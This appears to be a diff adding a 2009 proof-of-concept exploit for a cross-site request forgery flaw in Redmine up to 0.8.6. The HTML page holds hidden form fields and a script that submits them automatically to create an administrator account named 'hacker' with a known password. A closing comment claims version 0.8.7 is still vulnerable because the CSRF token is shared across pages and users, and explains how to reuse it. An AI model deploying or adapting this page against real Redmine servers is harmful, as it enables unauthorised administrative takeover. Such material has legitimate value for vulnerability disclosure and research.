@@ -1,0 +1,31 @@
+/**
+*  Redmine &lt;= 0.8.6 CSRF Add Admin User Exploit
+*  Discovered by: p0deje (http://p0deje.blogspot.com)
+*  Application: http://www.redmine.org/wiki/redmine/Download
+*  SA: http://www.redmine.org/news/30
+*  Date: 13.11.2009
+*  Versions affected: &lt;= 0.8.6
+*  Description: this is a simple exploit which exploits CSRF vulnerability in Redmine, it creates user account with adminstartive rights
+*/
+ 
+&lt;html&gt;
+&lt;body&gt;
+    &lt;form method=POST action=&quot;http://www.example.com/users/new&quot;&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;text&quot; value=&quot;hacker&quot; size=&quot;25&quot; name=&quot;user[login]&quot; id=&quot;user_login&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;text&quot; value=&quot;hacker&quot; size=&quot;30&quot; name=&quot;user[firstname]&quot; id=&quot;user_firstname&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;text&quot; value=&quot;hacker&quot; size=&quot;30&quot; name=&quot;user[lastname]&quot; id=&quot;user_lastname&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;text&quot; value=&quot;hacker@hacker.com&quot; size=&quot;30&quot; name=&quot;user[mail]&quot; id=&quot;user_mail&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;password&quot; size=&quot;25&quot; name=&quot;password&quot; id=&quot;password&quot; value=&quot;hacker&quot; /&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;password&quot; size=&quot;25&quot; name=&quot;password_confirmation&quot; id=&quot;password_confirmation&quot; value=&quot;hacker&quot; /&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;checkbox&quot; value=&quot;1&quot; name=&quot;user[admin]&quot; id=&quot;user_admin&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;user[admin]&quot;/&gt;
+       &lt;input style=&quot;display: none&quot; type=&quot;submit&quot; value=&quot;Create&quot; id=&quot;commit&quot; name=&quot;commit&quot; /&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.getElementById(&quot;commit&quot;).click();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+ 
+/**
+*  P.S. Actually, this vulnerability wasn&#039;t fixed in Redmine 0.8.7, because token was generated one time for all the pages and allthe users.
+*  Thus, you can add POST data with token of any user and exploit will be working again
+*/
